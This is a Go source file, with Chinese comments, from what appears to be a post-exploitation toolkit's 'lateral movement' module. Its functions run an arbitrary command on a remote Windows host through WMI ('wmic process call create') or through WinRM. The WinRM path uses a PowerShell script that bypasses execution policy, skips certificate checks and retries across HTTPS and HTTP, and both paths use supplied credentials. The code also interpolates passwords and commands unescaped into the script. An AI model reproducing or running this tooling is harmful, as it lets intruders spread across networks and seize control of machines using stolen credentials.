package lateral

import (
	"fmt"
)

// moveViaWMI 通过 WMI 执行横向移动
func (lm *LateralMover) moveViaWMI(req MoveRequest) MoveResult {
	result := MoveResult{
		Method: MethodWMI,
		Target: getTargetAddress(req.Target),
	}

	if err := validateRequest(req); err != nil {
		result.Error = err
		result.Message = err.Error()
		return result
	}

	targetAddr := getTargetAddress(req.Target)
	credStr := buildCredString(req.Credentials)

	args := []string{
		"/node:" + targetAddr,
		"/user:" + credStr,
		"/password:" + req.Credentials.Password,
		"process",
		"call",
		"create",
		req.Command,
	}

	output, err := lm.execCommand("wmic", args...)
	result.Output = sanitizeOutput(output)

	if err != nil {
		result.Success = false
		result.Error = err
		result.Message = fmt.Sprintf("WMI execution failed: %v", err)
		return result
	}

	if contains(output, "Successful") || contains(output, "ReturnValue = 0") {
		result.Success = true
		result.Message = "Command executed successfully via WMI"
	} else {
		result.Success = false
		result.Message = "WMI execution may have failed"
	}

	return result
}

// moveViaWinRM 通过 WinRM 执行横向移动
// 利用 SYSTEM 权限配置客户端，支持加密和非加密连接
func (lm *LateralMover) moveViaWinRM(req MoveRequest) MoveResult {
	result := MoveResult{
		Method: MethodWinRM,
		Target: getTargetAddress(req.Target),
	}

	if err := validateRequest(req); err != nil {
		result.Error = err
		result.Message = err.Error()
		return result
	}

	targetAddr := getTargetAddress(req.Target)
	credStr := buildCredString(req.Credentials)

	// 使用默认配置，尝试多种 WinRM 连接方式
	psScript := fmt.Sprintf(`
		[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
		
		# 准备凭据
		$pass = ConvertTo-SecureString "%s" -AsPlainText -Force
		$cred = New-Object System.Management.Automation.PSCredential("%s", $pass)
		$option = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
		
		# 执行远程命令
		$success = $false
		$output = ""
		$lastError = ""
		
		# 尝试1: HTTPS (端口 5986) - 最安全
		try {
			Write-Output "[尝试1] HTTPS 连接 (端口 5986)..."
			$output = Invoke-Command -ComputerName %s -Credential $cred -UseSSL -SessionOption $option -ScriptBlock { %s } -ErrorAction Stop 2>&1 | Out-String
			$success = $true
			Write-Output "[成功] HTTPS 连接成功"
		} catch {
			$lastError = "HTTPS失败: $($_.Exception.Message)"
			Write-Output "[失败] $lastError"
		}
		
		# 尝试2: HTTPS URI 明确指定
		if (-not $success) {
			try {
				Write-Output "[尝试2] HTTPS URI 连接 (https://%s:5986/wsman)..."
				$uri = "https://%s:5986/wsman"
				$output = Invoke-Command -ConnectionUri $uri -Credential $cred -SessionOption $option -ScriptBlock { %s } -ErrorAction Stop 2>&1 | Out-String
				$success = $true
				Write-Output "[成功] HTTPS URI 连接成功"
			} catch {
				$lastError = "HTTPS URI失败: $($_.Exception.Message)"
				Write-Output "[失败] $lastError"
			}
		}
		
		# 尝试3: HTTP (端口 5985) - 默认
		if (-not $success) {
			try {
				Write-Output "[尝试3] HTTP 连接 (默认端口 5985)..."
				$output = Invoke-Command -ComputerName %s -Credential $cred -SessionOption $option -ScriptBlock { %s } -ErrorAction Stop 2>&1 | Out-String
				$success = $true
				Write-Output "[成功] HTTP 连接成功"
			} catch {
				$lastError = "HTTP失败: $($_.Exception.Message)"
				Write-Output "[失败] $lastError"
			}
		}
		
		# 尝试4: HTTP URI 明确指定
		if (-not $success) {
			try {
				Write-Output "[尝试4] HTTP URI 连接 (http://%s:5985/wsman)..."
				$uri = "http://%s:5985/wsman"
				$output = Invoke-Command -ConnectionUri $uri -Credential $cred -SessionOption $option -ScriptBlock { %s } -ErrorAction Stop 2>&1 | Out-String
				$success = $true
				Write-Output "[成功] HTTP URI 连接成功"
			} catch {
				$lastError = "HTTP URI失败: $($_.Exception.Message)"
				Write-Output "[失败] $lastError"
			}
		}
		
		# 输出结果
		if ($success) {
			$output
		} else {
			throw "所有连接方式均失败: $lastError"
		}
	`, req.Credentials.Password, credStr,
		targetAddr, req.Command,
		targetAddr, targetAddr, req.Command,
		targetAddr, req.Command,
		targetAddr, targetAddr, req.Command)

	args := []string{
		"-ExecutionPolicy", "Bypass",
		"-NoProfile",
		"-Command", psScript,
	}

	output, err := lm.execCommand("powershell.exe", args...)
	result.Output = sanitizeOutput(output)

	if err != nil {
		result.Success = false
		result.Error = err
		result.Message = fmt.Sprintf("WinRM execution failed: %v", err)
		return result
	}

	result.Success = true
	result.Message = "Command executed successfully via WinRM"
	return result
}

// contains 检查字符串是否包含子串（不区分大小写）
func contains(s, substr string) bool {
	s = toLower(s)
	substr = toLower(substr)
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return true
		}
	}
	return false
}

func toLower(s string) string {
	result := make([]byte, len(s))
	for i := 0; i < len(s); i++ {
		if s[i] >= 'A' && s[i] <= 'Z' {
			result[i] = s[i] + 32
		} else {
			result[i] = s[i]
		}
	}
	return string(result)
}
